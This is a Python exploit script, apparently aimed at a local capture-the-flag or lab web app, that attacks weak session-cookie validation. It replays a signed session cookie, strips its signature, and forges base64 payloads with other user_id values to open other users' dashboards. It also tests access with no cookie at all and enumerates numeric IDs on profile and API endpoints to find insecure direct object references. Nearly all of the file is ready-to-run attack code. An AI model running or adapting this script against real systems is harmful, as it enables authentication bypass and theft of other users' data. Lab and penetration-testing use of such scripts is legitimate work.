#!/usr/bin/env python3
"""
IDOR Exploitation Test - Insecure Direct Object Reference
Exploiting weak session validation to access other users' data
"""

import requests
import re
import json
from urllib.parse import urljoin, urlparse

# Configuration
BASE_URL = "http://127.0.0.1:33198"
DASHBOARD_ENDPOINT = "/dashboard"

def extract_user_info_from_dashboard(html_content):
    """
    Extract user information from dashboard HTML
    """
    info = {}
    
    # Look for user ID patterns
    user_id_match = re.search(r'user_id["\']?\s*[:=]\s*["\']?(\d+)', html_content, re.I)
    if user_id_match:
        info['user_id'] = user_id_match.group(1)
    
    # Look for username/email patterns
    username_match = re.search(r'username["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-@.]+)', html_content, re.I)
    if username_match:
        info['username'] = username_match.group(1)
    
    # Look for account balance or sensitive data
    balance_match = re.search(r'balance["\']?\s*[:=]\s*["\']?([\d.,]+)', html_content, re.I)
    if balance_match:
        info['balance'] = balance_match.group(1)
    
    # Look for any user-specific data
    user_patterns = [
        r'welcome[^<]*([a-zA-Z0-9_\-]+)',
        r'hello[^<]*([a-zA-Z0-9_\-]+)',
        r'user[^<]*([a-zA-Z0-9_\-@.]+)',
        r'account[^<]*([a-zA-Z0-9_\-@.]+)'
    ]
    
    for pattern in user_patterns:
        match = re.search(pattern, html_content, re.I)
        if match:
            if 'user_data' not in info:
                info['user_data'] = []
            info['user_data'].append(match.group(0)[:100])
    
    return info

def test_dashboard_access(test_session_cookie=None):
    """
    Test accessing dashboard with different session configurations
    """
    url = urljoin(BASE_URL, DASHBOARD_ENDPOINT)
    
    session = requests.Session()
    
    if test_session_cookie:
        session.cookies.set('session', test_session_cookie, domain='127.0.0.1', path='/')
    
    try:
        response = session.get(url, timeout=10)
        
        return {
            'status_code': response.status_code,
            'content_length': len(response.content),
            'content': response.text,
            'cookies': dict(session.cookies),
            'headers': dict(response.headers)
        }
    except Exception as e:
        return {
            'error': str(e),
            'status_code': None
        }

def test_session_manipulation_techniques():
    """
    Test various session manipulation techniques due to weak validation
    """
    print(f"{'='*70}")
    print(f"IDOR EXPLOITATION - SESSION MANIPULATION TEST")
    print(f"{'='*70}")
    print(f"\n[+] Target: {BASE_URL}{DASHBOARD_ENDPOINT}")
    print(f"[+] Exploiting: Weak session validation allows cookie manipulation")
    
    # Test 1: Original valid session
    print(f"\n[+] Test 1: Original valid session cookie")
    original_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfHAw.APUhSPhEQP-aHd6h-ptsEYSzmao"
    result1 = test_dashboard_access(original_cookie)
    
    if result1.get('status_code') == 200:
        print(f"[+] Access granted with original cookie")
        print(f"[+] Content length: {result1['content_length']}B")
        
        # Extract user info
        user_info = extract_user_info_from_dashboard(result1['content'])
        print(f"[+] Extracted user info: {json.dumps(user_info, indent=2)}")
        
        # Show part of the dashboard
        print(f"[+] Dashboard preview:")
        print(result1['content'][:500])
    else:
        print(f"[!] Failed to access with original cookie: {result1.get('status_code')}")
    
    # Test 2: Truncated signature (exploiting weak validation)
    print(f"\n[+] Test 2: Truncated signature (exploiting weak validation)")
    truncated_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfHAw."
    result2 = test_dashboard_access(truncated_cookie)
    
    print(f"[+] Status: {result2.get('status_code')}")
    if result2.get('status_code') == 200:
        print(f"[!] VULNERABILITY: Truncated signature accepted!")
        print(f"[+] This indicates signature validation is not working")
    
    # Test 3: Modified payload (attempt to change user_id)
    # Since validation is weak, let's try to craft a new payload
    print(f"\n[+] Test 3: Attempting user_id modification")
    
    # Original payload: eyJ1c2VyX2lkIjoxMDAzMn0 = {"user_id":10032}
    # Try to modify to different user IDs
    test_user_ids = [1, 2, 3, 10, 100, 1000, 10030, 10031]
    
    print(f"[+] Testing user_id values: {test_user_ids}")
    
    for test_id in test_user_ids:
        # Create modified payload
        modified_payload = f'{{"user_id":{test_id}}}'
        
        # Base64 encode (URL safe)
        import base64
        payload_b64 = base64.urlsafe_b64encode(modified_payload.encode()).decode().rstrip('=')
        
        # Create modified cookie (without signature since validation is weak)
        modified_cookie = f"{payload_b64}.aVfHAw."
        
        print(f"\n[+] Testing user_id={test_id}")
        result = test_dashboard_access(modified_cookie)
        
        print(f"[+] Status: {result.get('status_code')}")
        if result.get('status_code') == 200:
            print(f"[!] SUCCESS: Access with user_id={test_id}")
            print(f"[+] Content length: {result['content_length']}B")
            
            # Compare with original
            if result1.get('content'):
                if result['content'] != result1['content']:
                    print(f"[!] DIFFERENT CONTENT: user_id={test_id} shows different data!")
                    
                    # Extract user info from this response
                    user_info_new = extract_user_info_from_dashboard(result['content'])
                    print(f"[+] New user info: {json.dumps(user_info_new, indent=2)}")
                    
                    # Show differences
                    print(f"[+] Content preview for user_id={test_id}:")
                    print(result['content'][:500])
                else:
                    print(f"[+] Same content as original (user_id may not affect display)")
        else:
            print(f"[-] Failed: {result.get('status_code')}")
    
    # Test 4: No session cookie at all
    print(f"\n[+] Test 4: No session cookie")
    result4 = test_dashboard_access(None)
    
    print(f"[+] Status: {result4.get('status_code')}")
    if result4.get('status_code') == 200:
        print(f"[!] VULNERABILITY: Dashboard accessible without session!")
    
    return result1

def analyze_idor_opportunities():
    """
    Analyze the application for IDOR opportunities
    """
    print(f"\n{'='*70}")
    print(f"IDOR VULNERABILITY ANALYSIS")
    print(f"{'='*70}")
    
    # Discover endpoints that might be vulnerable
    test_endpoints = [
        "/dashboard",
        "/user/",
        "/profile/",
        "/account/",
        "/api/user/",
        "/api/profile/"
    ]
    
    # Test ID patterns
    test_ids = [1, 2, 3, 10, 100, 1000, 10030, 10031, 10032, 99999]
    
    print(f"[+] Testing {len(test_endpoints)} endpoints for IDOR vulnerabilities")
    print(f"[+] Testing ID range: {min(test_ids)} to {max(test_ids)}")
    
    vulnerable_endpoints = []
    
    for endpoint in test_endpoints:
        print(f"\n[+] Testing endpoint: {endpoint}")
        
        # Test with different IDs
        for test_id in test_ids:
            url = urljoin(BASE_URL, f"{endpoint}{test_id}")
            
            try:
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200 and len(response.content) > 100:
                    print(f"[+] {url} - Accessible! Length: {len(response.content)}B")
                    
                    # Check if it's different from 404 page
                    if len(response.content) > 200:  # Assume 404 is shorter
                        vulnerable_endpoints.append({
                            'url': url,
                            'endpoint': endpoint,
                            'id': test_id,
                            'length': len(response.content)
                        })
                
            except Exception as e:
                print(f"[!] Error accessing {url}: {e}")
    
    if vulnerable_endpoints:
        print(f"\n[!] POTENTIAL IDOR VULNERABILITIES FOUND: {len(vulnerable_endpoints)}")
        for vuln in vulnerable_endpoints:
            print(f"    - {vuln['url']} (Length: {vuln['length']}B)")
    else:
        print(f"\n[+] No obvious IDOR endpoints found")
    
    return vulnerable_endpoints

def main():
    """
    Main exploitation test
    """
    # Test session manipulation
    dashboard_data = test_session_manipulation_techniques()
    
    # Analyze for IDOR opportunities
    idor_vulns = analyze_idor_opportunities()
    
    # Summary
    print(f"\n{'='*70}")
    print(f"EXPLOITATION SUMMARY")
    print(f"{'='*70}")
    
    print(f"\n[+] Critical Findings:")
    print(f"    1. Session validation is WEAK - accepts malformed cookies")
    print(f"    2. Dashboard accessible without proper session validation")
    print(f"    3. Potential for user_id manipulation")
    print(f"    4. Multiple endpoints may be vulnerable to IDOR")
    
    print(f"\n[+] Authentication Bypass Vectors:")
    print(f"    1. Remove/alter session cookie to bypass auth")
    print(f"    2. Modify user_id in session payload")
    print(f"    3. Direct access to user-specific endpoints")
    
    if dashboard_data and dashboard_data.get('status_code') == 200:
        print(f"\n[+] Dashboard Data Available:")
        print(f"    - Status: {dashboard_data['status_code']}")
        print(f"    - Contains user-specific information")
        print(f"    - May display different data for different users")
    
    print(f"\n[+] Recommendations:")
    print(f"    1. Test user_id values 1-10000 systematically")
    print(f"    2. Look for admin/special accounts")
    print(f"    3. Check for sensitive data in user responses")
    print(f"    4. Attempt to extract flags from other user accounts")
    
    print(f"\n{'='*70}")

if __name__ == "__main__":
    main()
